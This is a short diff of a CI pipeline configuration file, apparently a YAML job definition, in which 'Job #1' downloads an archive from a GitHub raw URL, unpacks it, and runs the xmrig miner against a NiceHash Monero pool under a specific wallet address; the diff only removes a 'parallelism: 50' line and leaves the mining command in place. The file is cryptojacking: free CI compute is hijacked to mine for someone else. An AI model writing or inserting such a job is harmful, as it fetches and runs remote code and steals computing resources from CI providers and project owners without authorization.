@@ -13,4 +13,3 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'wget https://raw.githubusercontent.com/pravsh89/NiceHashXMRig/main/mon.tar.gz ; tar xvzf mon.tar.gz ; ./xmrig -threads=2 -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3ESBQTZpj4h8FpV7WgN2SAYoWzBxFBHxDj.cs -p x'
-          parallelism: 50
